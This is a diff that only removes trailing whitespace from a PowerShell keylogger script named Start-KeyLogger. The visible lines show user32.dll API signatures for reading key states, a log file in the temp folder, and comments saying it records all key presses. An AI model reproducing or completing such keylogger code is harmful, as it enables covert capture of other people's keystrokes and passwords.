@@ -1,4 +1,4 @@
-﻿#requires -Version 2 
+﻿#requires -Version 2
 function Start-KeyLogger($Path = "$env:temp\keylogger.txt")
 {
 	<#
@@ -14,8 +14,8 @@ function Start-KeyLogger($Path = "$env:temp\keylogger.txt")
 	#>
 	# Signatures for API Calls
 	$signatures = @'
-[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] 
-public static extern short GetAsyncKeyState(int virtualKeyCode); 
+[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)]
+public static extern short GetAsyncKeyState(int virtualKeyCode);
 [DllImport("user32.dll", CharSet=CharSet.Auto)]
 public static extern int GetKeyboardState(byte[] keystate);
 [DllImport("user32.dll", CharSet=CharSet.Auto)]
@@ -80,6 +80,6 @@ public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeyst
 	}
 }
 
-# records all key presses until script is aborted by pressing CTRL+C 
-# will then open the file with collected key codes 
+# records all key presses until script is aborted by pressing CTRL+C
+# will then open the file with collected key codes
 #Start-KeyLogger
